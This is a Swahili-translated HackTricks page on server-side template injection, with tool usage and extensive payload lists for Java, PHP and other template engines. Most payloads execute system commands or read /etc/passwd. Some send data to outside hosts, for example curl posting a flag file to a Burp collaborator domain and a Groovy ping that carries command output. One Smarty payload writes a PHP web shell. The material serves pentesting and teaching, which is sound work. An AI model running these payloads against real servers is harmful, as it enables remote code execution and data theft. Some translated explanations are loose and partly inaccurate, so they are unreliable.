# SSTI (Uingizaji wa Kigezo Upande wa Seva)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}

## Ni nini SSTI (Uingizaji wa Kigezo Upande wa Seva)

Uingizaji wa kigezo upande wa seva ni udhaifu unapotokea mtu mwenye nia mbaya anaweza kuingiza msimbo wenye nia mbaya kwenye kigezo kinachotekelezwa kwenye seva. Udhaifu huu unaweza kupatikana katika teknolojia mbalimbali, ikiwa ni pamoja na Jinja.

Jinja ni injini maarufu ya kigezo inayotumiwa katika programu za wavuti. Hebu tuchukue mfano unaodhihirisha kipande cha msimbo kinachoweza kudukuliwa kwa kutumia Jinja:
```python
output = template.render(name=request.args.get('name'))
```
Katika msimbo huu unaoweza kudhurika, parameter ya `name` kutoka kwa ombi la mtumiaji inapitishwa moja kwa moja kwenye kigezo kwa kutumia kazi ya `render`. Hii inaweza kumruhusu mtu mwenye nia mbaya kuingiza msimbo wenye madhara kwenye parameter ya `name`, hivyo kusababisha uingizaji wa kigezo upande wa seva.

Kwa mfano, mtu mwenye nia mbaya anaweza kuunda ombi lenye mzigo kama huu:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Kifurushi `{{kitu-kibaya-hapa}}` kimeingizwa kwenye parameter ya `jina`. Kifurushi hiki kinaweza kuwa na maelekezo ya templeti ya Jinja ambayo inawezesha muhalifu kutekeleza nambari isiyo ruhusiwa au kudhibiti injini ya templeti, na hivyo kupata udhibiti wa seva.

Ili kuzuia udhaifu wa uingizaji wa templeti upande wa seva, watengenezaji wanapaswa kuhakikisha kuwa data ya mtumiaji imefanyiwa usafi na kuthibitishwa vizuri kabla ya kuwekwa kwenye templeti. Kutekeleza uthibitishaji wa data na kutumia mbinu za kuepuka kulingana na muktadha kunaweza kusaidia kupunguza hatari ya udhaifu huu.

### Uchunguzi
Ili kugundua Uingizaji wa Templeti Upande wa Seva (SSTI), kwanza, **kufanya majaribio ya templeti** ni njia rahisi. Hii inahusisha kuingiza mfululizo wa herufi maalum (**`${{<%[%'"}}%\`**) kwenye templeti na kuchambua tofauti kati ya majibu ya seva kwa data ya kawaida ikilinganishwa na kifurushi maalum hiki. Ishara za udhaifu ni pamoja na:
- Kutokea kwa makosa, kuonyesha udhaifu na labda injini ya templeti.
- Kutokuwepo kwa kifurushi katika uchunguzi, au sehemu zake kukosekana, ikimaanisha kuwa seva inaiprocess tofauti na data ya kawaida.

- **Muktadha wa Nakala Wazi**: Tofautisha na XSS kwa kuangalia ikiwa seva inahesabu maelezo ya templeti (kwa mfano, `{{7*7}}`, `${7*7}`).

- **Muktadha wa Nambari**: Thibitisha udhaifu kwa kubadilisha vigezo vya kuingiza. Kwa mfano, kubadilisha `salamu` katika `http://tovuti-isio-salama.com/?salamu=data.jina` ili kuona ikiwa matokeo ya seva ni ya kubadilika au yamefikia kikomo, kama vile `salamu=data.jina}}hello` inarudi jina la mtumiaji.

#### Hatua ya Kutambua
Kutambua injini ya templeti kunahusisha kuchambua ujumbe wa makosa au kujaribu kwa mikono mifumo mbalimbali ya lugha. Mifumo ya kawaida inayosababisha makosa ni pamoja na `${7/0}`, `{{7/0}}`, na `<%= 7/0 %>`. Kuchunguza majibu ya seva kwa operesheni za hisabati kunasaidia kubainisha injini ya templeti maalum.

## Zana

### [TInjA](https://github.com/Hackmanit/TInjA)

scanner ya SSTI + CSTI yenye ufanisi inayotumia polyglots mpya
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap ni chombo cha kugundua na kuchunguza mashambulizi ya SSTI (Server-Side Template Injection) kwenye tovuti. Inatumia njia ya kuchunguza kwa kuingiza templates za kawaida na kuchunguza majibu ya tovuti ili kugundua ikiwa kuna dalili za SSTI. Chombo hiki kinaweza kuwa na manufaa katika kufanya ukaguzi wa usalama na kupima usalama wa tovuti yako au tovuti nyingine. 

Chombo hiki kinafuatilia mifumo ya templates maarufu kama Jinja2, Twig, Freemarker, na mifumo mingine ya templates inayotumiwa katika maendeleo ya wavuti. Inachunguza dalili za SSTI kwa kuingiza templates za kawaida na kuchambua majibu ya tovuti. 

SSTImap inaweza kutumiwa kwa urahisi kwa kufuata hatua rahisi za ufungaji na matumizi. Inahitaji Python 3.x na inasaidia mifumo ya uendeshaji ya Linux na Windows. 

Kwa maelezo zaidi juu ya jinsi ya kufunga na kutumia SSTImap, tafadhali rejea [hapa](https://github.com/vladko312/sstimap).
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap ni chombo cha kuchunguza na kudukua mashimo ya usalama katika mifumo ya kuingiza templeti upande wa seva (Server-Side Template Injection). Inaweza kutumika kwa ufanisi katika upimaji wa kuingiza templeti upande wa seva (SSTI) kwenye maombi ya wavuti. Chombo hiki kinaweza kugundua na kutumia mashimo ya usalama katika mifumo ya templeti kama Jinja2, Mako, na Twig. Tplmap inatoa njia rahisi na yenye nguvu ya kuchunguza na kudukua mashimo ya usalama katika mifumo ya SSTI.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Jedwali la Uingizaji wa Templeti](https://github.com/Hackmanit/template-injection-table)

jedwali linaloingiliana lenye uingizaji wa templeti wenye ufanisi zaidi pamoja na majibu yanayotarajiwa ya injini 44 muhimu zaidi za templeti.

## Mbinu za Uvamizi

### Kwa Ujumla

Katika **orodha ya maneno** hii unaweza kupata **majaribio yaliyofafanuliwa** katika mazingira ya baadhi ya injini zilizotajwa hapa chini:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Uingizaji wa Msingi**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Pata mazingira ya mifumo ya pembejeo**

Ili kupata mazingira ya mifumo ya pembejeo kwa kutumia Java, unaweza kutumia njia ifuatayo:

```java
Map<String, String> env = System.getenv();
for (String key : env.keySet()) {
    String value = env.get(key);
    System.out.println(key + " = " + value);
}
```

Msimbo huu utakusaidia kupata na kuchapisha mazingira ya mifumo ya pembejeo kwenye konsoli. Kila mazingira ya mfumo itaonyeshwa kama jozi ya jina na thamani yake.
```java
${T(java.lang.System).getenv()}
```
**Java - Pata /etc/passwd**

Kwa kutumia kificho cha Server-Side Template Injection (SSTI), unaweza kupata faili ya `/etc/passwd` kwenye mfumo wa lengo. Hapa kuna njia ya kufanya hivyo kwa kutumia Java:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SSTIExample {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Kificho hiki kinatumia `Runtime.getRuntime().exec()` kutekeleza amri ya shell `cat /etc/passwd` na kusoma matokeo yake. Kisha, matokeo yanasomwa mstari kwa mstari na kuchapishwa kwenye konsoli.

**Tahadhari:**
Kumbuka kuwa kufanya upatikanaji wa faili kama `/etc/passwd` ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kuzingatia sheria na kufanya upimaji wa usalama (pentesting) tu kwenye mifumo ambayo una idhini ya kufanya hivyo.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Unaweza kujaribu mizigo yako kwenye [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Hakuna kitu`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Kuepuka Sanduku la Mchanga**

‚ö†Ô∏è inafanya kazi tu kwenye toleo la Freemarker chini ya 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Maelezo zaidi**

* Katika sehemu ya FreeMarker ya [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Maelezo zaidi**

* Katika sehemu ya Velocity ya [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

Katika Thymeleaf, jaribio la kawaida la kugundua udhaifu wa SSTI ni uchanganuzi `${7*7}`, ambao pia unatumika kwa injini hii ya templeti. Kwa ajili ya utekelezaji wa kanuni ya mbali, inaweza kutumika uchanganuzi kama ifuatavyo:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf inahitaji uchanganuzi huu kuwekwa ndani ya sifa maalum. Hata hivyo, _uchanganuzi wa ndani wa uchanganuzi_ unaweza kutumika kwa maeneo mengine ya templeti, kwa kutumia sintaksia kama `[[...]]` au `[(...)]`. Hivyo, uchanganuzi rahisi wa jaribio la SSTI unaweza kuonekana kama `[[${7*7}]]`.

Hata hivyo, uwezekano wa uchanganuzi huu kufanya kazi ni mdogo kwa ujumla. Mpangilio wa msingi wa Thymeleaf hausaidii uundaji wa templeti za kibinadamu; templeti lazima ziwe tayari kabla. Watengenezaji wangehitaji kutekeleza `TemplateResolver` yao wenyewe ili kuunda templeti kutoka kwa herufi kwa wakati halisi, jambo ambalo si la kawaida.

Thymeleaf pia inatoa _uchanganuzi wa awali wa uchanganuzi_, ambapo uchanganuzi ndani ya mstari wa chini (`__...__`) unapewa awali. Kipengele hiki kinaweza kutumika katika ujenzi wa uchanganuzi, kama ilivyodhihirishwa katika nyaraka za Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Mfano wa Udhaifu katika Thymeleaf**

Fikiria kificho kifuatacho, ambacho kinaweza kuwa na udhaifu wa kuchexploit:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Hii inaonyesha kuwa ikiwa injini ya kigeuzi ya templeti inachakata vipengele hivi kwa njia isiyofaa, inaweza kusababisha utekelezaji wa nambari kijijini kupitia kufikia URL kama:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Maelezo zaidi**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Kuepuka vichujio**

Inaweza kutumika mchanganyiko wa maelezo ya kipekee, ikiwa `${...}` haifanyi kazi, jaribu `#{...}`, `*{...}`, `@{...}` au `~{...}`.

* Soma `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Skripti ya kuzalisha mzigo wa payload
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Maelezo Zaidi**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Ubadilishaji wa Maoni ya Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Toleo la zamani la Pebble ( < toleo 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Toleo jipya la Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava ni injini ya templeti ya upande wa seva iliyoundwa kwa lugha ya Java. Inaruhusu matumizi ya templeti za seva kwenye programu za Java. Jinjava inasaidia vipengele vingi vya templeti kama vile mchanganyiko wa maandishi, mizunguko, na masharti. Inatoa njia salama ya kutekeleza templeti za seva na kuzuia mashambulizi ya Server-Side Template Injection (SSTI).
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava ni mradi wa chanzo wazi ulioendelezwa na Hubspot, unapatikana kwenye [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Utekelezaji wa Amri**

Imetatuliwa na [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Maelezo zaidi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` wazi na kufunga taarifa
* `{{ }}` wazi na kufunga uchambuzi
* `{# #}` wazi na kufunga maoni
* `{{ ombi }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{ombi.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{ombi.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Tafuta "com.hubspot.content.hubl.context.TemplateContextRequest" na ugundue [mradi wa Jinjava kwenye Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Maelezo zaidi**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{ombi}}, ${{kikao}}, {{faceContext}}`

Lugha ya Ufafanuzi (EL) ni kipengele muhimu kinachorahisisha mwingiliano kati ya safu ya uwasilishaji (kama kurasa za wavuti) na mantiki ya programu (kama mabawa yaliyosimamiwa) katika JavaEE. Inatumika sana katika teknolojia nyingi za JavaEE kusaidia mawasiliano haya. Teknolojia muhimu za JavaEE zinazotumia EL ni pamoja na:

- **JavaServer Faces (JSF)**: Inatumia EL kuunganisha vipengele katika kurasa za JSF na data na hatua za nyuma zinazolingana.
- **JavaServer Pages (JSP)**: EL hutumiwa katika JSP kwa kupata na kubadilisha data ndani ya kurasa za JSP, hivyo kuwa rahisi kuunganisha vipengele vya ukurasa na data ya programu.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL inashirikiana na CDI kuruhusu mwingiliano laini kati ya safu ya wavuti na mabawa yaliyosimamiwa, kuhakikisha muundo thabiti zaidi wa programu.

Angalia ukurasa ufuatao ili kujifunza zaidi kuhusu **utumiaji mbaya wa watekelezaji wa EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Mipuuzi ya Usimamizi wa Usalama ifuatayo imetolewa kutoka kwenye [**makala hii**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Maelezo zaidi**

* Katika sehemu ya Smarty ya [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Kosa`
* `{{foobar}} Hakuna kitu`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Muundo wa Kigezo**

Twig ni mfumo maarufu wa kigezo kinachotumiwa sana katika maendeleo ya wavuti. Inatoa njia rahisi na yenye nguvu ya kuunda na kusimamia vigezo vya wavuti. Twig hutumiwa sana katika mifumo ya PHP kama vile Symfony na Laravel.

**Kuchanganua na Kutumia SSI (Server-Side Template Injection)**

SSI (Server-Side Template Injection) ni njia ya kuvunja usalama ambapo mshambuliaji anaweza kuingiza na kutekeleza nambari ya kigezo upande wa seva. Hii inaweza kusababisha matokeo mabaya kama vile kufichua data nyeti, kufikia faili za mfumo, au hata kuchukua udhibiti kamili wa seva.

Kwa kutumia SSI, mshambuliaji anaweza kuchanganua na kubadilisha vigezo vya Twig. Hii inaweza kusababisha kutekelezwa kwa nambari ya hatari, kama vile kufikia faili za mfumo au kufichua data nyeti.

**Kugundua na Kuzuia SSI**

Kugundua na kuzuia SSI ni muhimu katika kuhakikisha usalama wa wavuti. Hapa kuna hatua kadhaa za kufuata:

1. Tumia toleo la hivi karibuni la Twig na mifumo ya PHP inayotumia Twig.
2. Sanitize na ukague kwa uangalifu data inayopokelewa kutoka kwa watumiaji kabla ya kuiweka kwenye vigezo vya Twig.
3. Tumia mazoea bora ya maendeleo ya wavuti kama vile kuzuia upatikanaji wa faili za mfumo na kudhibiti ufikiaji wa data nyeti.
4. Fanya ukaguzi wa usalama mara kwa mara ili kugundua na kurekebisha mapungufu yoyote ya usalama.

Kwa kufuata hatua hizi, unaweza kuzuia SSI na kuhakikisha usalama wa wavuti yako.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

